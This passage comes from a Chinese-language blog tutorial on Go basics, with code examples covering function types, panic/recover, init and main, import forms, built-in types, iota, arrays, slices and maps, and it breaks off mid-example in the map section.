<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> testInt <span class="function"><span class="keyword">func</span><span class="params">(<span class="type">int</span>)</span></span> <span class="type">bool</span> <span class="comment">// 声明了一个函数类型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isOdd</span><span class="params">(integer <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> integer%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">isEven</span><span class="params">(integer <span class="type">int</span>)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> integer%<span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明的函数类型在这个地方当做了一个参数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">filter</span><span class="params">(slice []<span class="type">int</span>, f testInt)</span></span> []<span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result []<span class="type">int</span></span><br><span class="line">    <span class="keyword">for</span> _, value := <span class="keyword">range</span> slice &#123;</span><br><span class="line">        <span class="keyword">if</span> f(value) &#123;</span><br><span class="line">            result = <span class="built_in">append</span>(result, value)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    slice := []<span class="type">int</span> &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">7</span>&#125;</span><br><span class="line">    fmt.Println(<span class="string">&quot;slice = &quot;</span>, slice)</span><br><span class="line">    odd := filter(slice, isOdd)    <span class="comment">// 函数当做值来传递了</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Odd elements of slice are: &quot;</span>, odd)</span><br><span class="line">    even := filter(slice, isEven)  <span class="comment">// 函数当做值来传递了</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Even elements of slice are: &quot;</span>, even)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>函数当做值和类型在我们写一些通用接口的时候非常有用，通过上面例子我们看到 testInt 这个类型是一个函数类型，然后两个 filter 函数的参数和返回值与 testInt 类型是一样的，但是我们可以实现很多种的逻辑，这样使得我们的程序变得非常的灵活。</p>
<h2 id="Panic-和-Recover"><a href="#Panic-和-Recover" class="headerlink" title="Panic 和 Recover"></a>Panic 和 Recover</h2><p>Go 没有像 Java 那样的异常机制，它不能抛出异常，而是使用了 panic 和 recover 机制。一定要记住，你应当把它作为最后的手段来使用，也就是说，你的代码中应当没有，或者很少有 panic 的东西。这是个强大的工具，请明智地使用它。那么，我们应该如何使用它呢？</p>
<p>Panic</p>
<p>是一个内建函数，可以中断原有的控制流程，进入一个令人恐慌的流程中。当函数 F 调用 panic，函数 F 的执行被中断，但是 F 中的延迟函数会正常执行，然后 F 返回到调用它的地方。在调用的地方，F 的行为就像调用了 panic。这一过程继续向上，直到发生 panic 的 goroutine 中所有调用的函数返回，此时程序退出。恐慌可以直接调用 panic 产生。也可以由运行时错误产生，例如访问越界的数组。</p>
<p>Recover</p>
<p>是一个内建的函数，可以让进入令人恐慌的流程中的 goroutine 恢复过来。recover 仅在延迟函数中有效。在正常的执行过程中，调用 recover 会返回 nil，并且没有其它任何效果。如果当前的 goroutine 陷入恐慌，调用 recover 可以捕获到 panic 的输入值，并且恢复正常的执行。</p>
<p>下面这个函数演示了如何在过程中使用 <code>panic</code></p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> user = os.Getenv(<span class="string">&quot;USER&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">if</span> user == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        <span class="built_in">panic</span>(<span class="string">&quot;no value for $USER&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面这个函数检查作为其参数的函数在执行时是否会产生 <code>panic</code>：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">throwsPanic</span><span class="params">(f <span class="keyword">func</span>()</span></span>) (b <span class="type">bool</span>) &#123;</span><br><span class="line">    <span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">if</span> x := <span class="built_in">recover</span>(); x != <span class="literal">nil</span> &#123;</span><br><span class="line">            b = <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    f() <span class="comment">// 执行函数f，如果f中出现了panic，那么就可以恢复回来</span></span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="main-函数和-init-函数"><a href="#main-函数和-init-函数" class="headerlink" title="main 函数和 init 函数"></a><code>main</code> 函数和 <code>init</code> 函数</h2><p>Go 里面有两个保留的函数：init 函数（能够应用于所有的 package ）和 main 函数（只能应用于 package main）。这两个函数在定义时不能有任何的参数和返回值。虽然一个 package 里面可以写任意多个 init 函数，但这无论是对于可读性还是以后的可维护性来说，我们都强烈建议用户在一个 package 中每个文件只写一个 init 函数。</p>
<p>Go 程序会自动调用 init() 和 main()，所以你不需要在任何地方调用这两个函数。每个 package 中的 init 函数都是可选的，但 package main 就必须包含一个 main 函数。</p>
<p>程序的初始化和执行都起始于 main 包。如果 main 包还导入了其它的包，那么就会在编译时将它们依次导入。有时一个包会被多个包同时导入，那么它只会被导入一次（例如很多包可能都会用到 fmt 包，但它只会被导入一次，因为没有必要导入多次）。当一个包被导入时，如果该包还导入了其它的包，那么会先将其它包导入进来，然后再对这些包中的包级常量和变量进行初始化，接着执行 init 函数（如果有的话），依次类推。等所有被导入的包都加载完毕了，就会开始对 main 包中的包级常量和变量进行初始化，然后执行 main 包中的 init 函数（如果存在的话），最后执行 main 函数</p>
<h2 id="import"><a href="#import" class="headerlink" title="import"></a>import</h2><p>我们在写 Go 代码的时候经常用到 import 这个命令用来导入包文件，而我们经常看到的方式参考如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>然后我们代码里面可以通过如下的方式调用</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(<span class="string">&quot;hello world&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>上面这个 fmt 是 Go 语言的标准库，其实是去 GOROOT 环境变量指定目录下去加载该模块，当然 Go 的 import 还支持如下两种方式来加载自己写的模块：</p>
<p>相对路径</p>
<p>import “.&#x2F;model” &#x2F;&#x2F; 当前文件同一目录的 model 目录，但是不建议这种方式来 import</p>
<p>绝对路径</p>
<p>import “shorturl&#x2F;model” &#x2F;&#x2F; 加载 gopath&#x2F;src&#x2F;shorturl&#x2F;model 模块</p>
<p>上面展示了一些 import 常用的几种方式，但是还有一些特殊的 import，让很多新手很费解，下面我们来一一讲解一下到底是怎么一回事</p>
<p>1.点操作</p>
<p>我们有时候会看到如下的方式导入包</p>
<p>import (<br>    . “fmt”<br>)<br>这个点操作的含义就是这个包导入之后在你调用这个包的函数时，你可以省略前缀的包名，也就是前面你调用的 fmt.Println (“hello world”) 可以省略的写成 Println (“hello world”)</p>
<p>2.别名操作</p>
<p>别名操作顾名思义我们可以把包命名成另一个我们用起来容易记忆的名字</p>
<p>import(<br>    f “fmt”<br>)<br>别名操作的话调用包函数时前缀变成了我们的前缀，即 f.Println (“hello world”)</p>
<p>3._操作</p>
<p>这个操作经常是让很多人费解的一个操作符，请看下面这个 import</p>
<p>import (<br>    “database&#x2F;sql”<br>    _ “github.com&#x2F;ziutek&#x2F;mymysql&#x2F;godrv”<br>)<br>_操作其实是引入该包，而不直接使用包里面的函数，而是调用了该包里面的 init 函数。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/15/1.go%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/15/1.go%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">1.go基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-15 17:41:38 / 修改时间：18:58:00" itemprop="dateCreated datePublished" datetime="2022-09-15T17:41:38+08:00">2022-09-15</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Go-web-%E7%BC%96%E7%A8%8B/" itemprop="url" rel="index"><span itemprop="name">Go web 编程</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h1><h2 id="var关键字定义变量"><a href="#var关键字定义变量" class="headerlink" title="var关键字定义变量"></a>var关键字定义变量</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义一个名称为 “variableName”，类型为 &quot;type&quot; 的变量</span></span><br><span class="line"><span class="keyword">var</span> variableName <span class="keyword">type</span></span><br></pre></td></tr></table></figure>

<p>简化写法</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// 定义三个变量，它们分别初始化为相应的值</span></span><br><span class="line">    vname1 为 v1，vname2 为 v2，vname3 为 v3</span><br><span class="line">    编译器会根据初始化的值自动推导出相应的类型</span><br><span class="line">vname1, vname2, vname3 := v1, v2, v3</span><br></pre></td></tr></table></figure>

<p>现在是不是看上去非常简洁了？:&#x3D; 这个符号直接取代了 var 和 type, 这种形式叫做简短声明。不过它有一个限制，那就是它只能用在函数内部；在函数外部使用则会无法编译通过，所以一般用 var 方式来定义全局变量。</p>
<p>_（下划线）是个特殊的变量名，任何赋予它的值都会被丢弃。在这个例子中，我们将值 35 赋予 b，并同时丢弃 34：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_, b := <span class="number">34</span>, <span class="number">35</span></span><br></pre></td></tr></table></figure>

<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>语法如下</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> constantName = value</span><br><span class="line"><span class="comment">// 如果需要，也可以明确指定常量的类型：</span></span><br><span class="line"><span class="keyword">const</span> Pi <span class="type">float32</span> = <span class="number">3.1415926</span></span><br></pre></td></tr></table></figure>

<h2 id="内置基础类型"><a href="#内置基础类型" class="headerlink" title="内置基础类型"></a>内置基础类型</h2><h3 id="Boolean"><a href="#Boolean" class="headerlink" title="Boolean"></a>Boolean</h3><p>在 Go 中，布尔值的类型为 <code>bool</code>，值是 <code>true</code> 或 <code>false</code>，默认为 <code>false</code>。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 示例代码</span></span><br><span class="line"><span class="keyword">var</span> isActive <span class="type">bool</span>  <span class="comment">// 全局变量声明</span></span><br><span class="line"><span class="keyword">var</span> enabled, disabled = <span class="literal">true</span>, <span class="literal">false</span>  <span class="comment">// 忽略类型的声明</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> available <span class="type">bool</span>  <span class="comment">// 一般声明</span></span><br><span class="line">    valid := <span class="literal">false</span>      <span class="comment">// 简短声明</span></span><br><span class="line">    available = <span class="literal">true</span>    <span class="comment">// 赋值操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h3><p>整数类型有无符号和带符号两种。Go 同时支持 <code>int</code> 和 <code>uint</code>，这两种类型的长度相同，但具体长度取决于不同编译器的实现</p>
<p>浮点数的类型有 <code>float32</code> 和 <code>float64</code> 两种（没有 <code>float</code> 类型），默认是 <code>float64</code>。</p>
<p>这就是全部吗？No！Go 还支持复数。它的默认类型是 complex128（64 位实数 + 64 位虚数）。如果需要小一些的，也有 complex64 (32 位实数 + 32 位虚数)。复数的形式为 RE + IMi，其中 RE 是实数部分，IM 是虚数部分，而最后的 i 是虚数单位。下面是一个使用复数的例子：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c <span class="type">complex64</span> = <span class="number">5</span>+<span class="number">5i</span></span><br><span class="line"><span class="comment">//output: (5+5i)</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;Value is: %v&quot;</span>, c)</span><br></pre></td></tr></table></figure>

<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>我们在上一节中讲过，Go 中的字符串都是采用 <code>UTF-8</code> 字符集编码。字符串是用一对双引号（<code>&quot;&quot;</code>）或反引号（<code> </code>）括起来定义，它的类型是 <code>string</code>。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 示例代码</span></span><br><span class="line"><span class="keyword">var</span> frenchHello <span class="type">string</span>  <span class="comment">// 声明变量为字符串的一般方法</span></span><br><span class="line"><span class="keyword">var</span> emptyString <span class="type">string</span> = <span class="string">&quot;&quot;</span>  <span class="comment">// 声明了一个字符串变量，初始化为空字符串</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test</span><span class="params">()</span></span> &#123;</span><br><span class="line">    no, yes, maybe := <span class="string">&quot;no&quot;</span>, <span class="string">&quot;yes&quot;</span>, <span class="string">&quot;maybe&quot;</span>  <span class="comment">// 简短声明，同时声明多个变量</span></span><br><span class="line">    japaneseHello := <span class="string">&quot;Konichiwa&quot;</span>  <span class="comment">// 同上</span></span><br><span class="line">    frenchHello = <span class="string">&quot;Bonjour&quot;</span>  <span class="comment">// 常规赋值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 Go 中字符串是不可变的</p>
<p>Go 中可以使用 <code>+</code> 操作符来连接两个字符串：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s := <span class="string">&quot;hello,&quot;</span></span><br><span class="line">m := <span class="string">&quot; world&quot;</span></span><br><span class="line">a := s + m</span><br><span class="line">fmt.Printf(<span class="string">&quot;%s\n&quot;</span>, a)</span><br></pre></td></tr></table></figure>

<h3 id="错误类型"><a href="#错误类型" class="headerlink" title="错误类型"></a>错误类型</h3><p>Go 内置有一个 <code>error</code> 类型，专门用来处理错误信息，Go 的 <code>package</code> 里面还专门有一个包 <code>errors</code> 来处理错误：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">err := errors.New(<span class="string">&quot;emit macho dwarf: elf header corrupted&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">    fmt.Print(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="iota-枚举"><a href="#iota-枚举" class="headerlink" title="iota 枚举"></a>iota 枚举</h3><p>Go 里面有一个关键字 <code>iota</code>，这个关键字用来声明 <code>enum</code> 的时候采用，它默认开始值是 0，const 中每增加一行加 1：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    x = <span class="literal">iota</span> <span class="comment">// x == 0</span></span><br><span class="line">    y = <span class="literal">iota</span> <span class="comment">// y == 1</span></span><br><span class="line">    z = <span class="literal">iota</span> <span class="comment">// z == 2</span></span><br><span class="line">    w        <span class="comment">// 常量声明省略值时，默认和之前一个值的字面相同。这里隐式地说 w = iota，因此 w == 3。其实上面 y 和 z 可同样不用 &quot;= iota&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> v = <span class="literal">iota</span> <span class="comment">// 每遇到一个 const 关键字，iota 就会重置，此时 v == 0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    h, i, j = <span class="literal">iota</span>, <span class="literal">iota</span>, <span class="literal">iota</span> <span class="comment">// h=0,i=0,j=0 iota在同一行值相同</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    a       = <span class="literal">iota</span> <span class="comment">// a=0</span></span><br><span class="line">    b       = <span class="string">&quot;B&quot;</span></span><br><span class="line">    c       = <span class="literal">iota</span>             <span class="comment">//c=2</span></span><br><span class="line">    d, e, f = <span class="literal">iota</span>, <span class="literal">iota</span>, <span class="literal">iota</span> <span class="comment">//d=3,e=3,f=3</span></span><br><span class="line">    g       = <span class="literal">iota</span>             <span class="comment">//g = 4</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(a, b, c, d, e, f, g, h, i, j, x, y, z, w, v)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="array"><a href="#array" class="headerlink" title="array"></a>array</h3><p><code>array</code> 就是数组，它的定义方式如下：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr [n]<span class="keyword">type</span></span><br></pre></td></tr></table></figure>

<p>在 <code>[n]type</code> 中，<code>n</code> 表示数组的长度，<code>type</code> 表示存储元素的类型。对数组的操作和其它语言类似，都是通过 <code>[]</code> 来进行读取或赋值：</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr [<span class="number">10</span>]<span class="type">int</span>  <span class="comment">// 声明了一个int类型的数组</span></span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">42</span>      <span class="comment">// 数组下标是从0开始的</span></span><br><span class="line">arr[<span class="number">1</span>] = <span class="number">13</span>      <span class="comment">// 赋值操作</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;The first element is %d\n&quot;</span>, arr[<span class="number">0</span>])  <span class="comment">// 获取数据，返回42</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;The last element is %d\n&quot;</span>, arr[<span class="number">9</span>]) <span class="comment">// 返回未赋值的最后一个元素，默认返回0</span></span><br></pre></td></tr></table></figure>

<p>由于长度也是数组类型的一部分，因此 [3]int 与 [4]int 是不同的类型，数组也就不能改变长度。数组之间的赋值是值的赋值，即当把一个数组作为参数传入函数的时候，传入的其实是该数组的副本，而不是它的指针。如果要使用指针，那么就需要用到后面介绍的 slice 类型了。</p>
<p>数组可以使用另一种 :&#x3D; 来声明</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">a := [<span class="number">3</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125; <span class="comment">// 声明了一个长度为3的int数组</span></span><br><span class="line"></span><br><span class="line">b := [<span class="number">10</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125; <span class="comment">// 声明了一个长度为 10 的 int 数组，其中前三个元素初始化为 1、2、3，其它默认为 0</span></span><br><span class="line"></span><br><span class="line">c := [...]<span class="type">int</span>&#123;<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125; <span class="comment">// 可以省略长度而采用 `...` 的方式，Go 会自动根据元素个数来计算长度</span></span><br></pre></td></tr></table></figure>

<h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><p>在很多应用场景中，数组并不能满足我们的需求。在初始定义数组时，我们并不知道需要多大的数组，因此我们就需要 “动态数组”。在 Go 里面这种数据结构叫 slice</p>
<p>slice 并不是真正意义上的动态数组，而是一个引用类型。slice 总是指向一个底层 array，slice 的声明也可以像 array 一样，只是不需要长度。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 和声明 array 一样，只是少了长度</span></span><br><span class="line"><span class="keyword">var</span> fslice []<span class="type">int</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">slice := []<span class="type">byte</span> &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>

<p>slice 可以从一个数组或一个已经存在的 slice 中再次声明。slice 通过 array[i:j] 来获取，其中 i 是数组的开始位置，j 是结束位置，但不包含 array[j]，它的长度是 j-i。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 声明一个含有 10 个元素元素类型为 byte 的数组</span></span><br><span class="line"><span class="keyword">var</span> ar = [<span class="number">10</span>]<span class="type">byte</span> &#123;<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 声明两个含有 byte 的 slice</span></span><br><span class="line"><span class="keyword">var</span> a, b []<span class="type">byte</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// a 指向数组的第 3 个元素开始，并到第五个元素结束，</span></span><br><span class="line">a = ar[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line"><span class="comment">// 现在 a 含有的元素: ar[2]、ar[3]和ar[4]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// b 是数组 ar 的另一个 slice</span></span><br><span class="line">b = ar[<span class="number">3</span>:<span class="number">5</span>]</span><br><span class="line"><span class="comment">// b 的元素是：ar[3] 和 ar[4]</span></span><br></pre></td></tr></table></figure>

<p>对于 slice 有几个有用的内置函数：</p>
<p>len 获取 slice 的长度<br>cap 获取 slice 的最大容量<br>append 向 slice 里面追加一个或者多个元素，然后返回一个和 slice 一样类型的 slice<br>copy 函数 copy 从源 slice 的 src 中复制元素到目标 dst，并且返回复制的元素的个数</p>
<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>map 也就是 Python 中字典的概念，它的格式为 map[keyType]valueType</p>
<p>我们看下面的代码，map 的读取和设置也类似 slice 一样，通过 key 来操作，只是 slice 的 index 只能是 int 类型，而 map 多了很多类型，可以是 int，可以是 string 及所有完全定义了 &#x3D;&#x3D; 与 !&#x3D; 操作的类型。</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 声明一个 key 是字符串，值为 int 的字典, 这种方式的声明需要在使用之前使用 make 初始化</span></span><br><span class="line"><span class="keyword">var</span> numbers <span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span></span><br><span class="line"><span class="comment">// 另一种 map 的声明方式</span></span><br><span class="line">numbers := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)</span><br><span class="line">numbers[<span class="string">&quot;one&quot;</span>] = <span class="number">1</span>  <span class="comment">// 赋值</span></span><br><span class="line">numbers[<span class="string">&quot;ten&quot;</span>] = <span class="number">10</span> <span class="comment">// 赋值</span></span><br><span class="line">numbers[<span 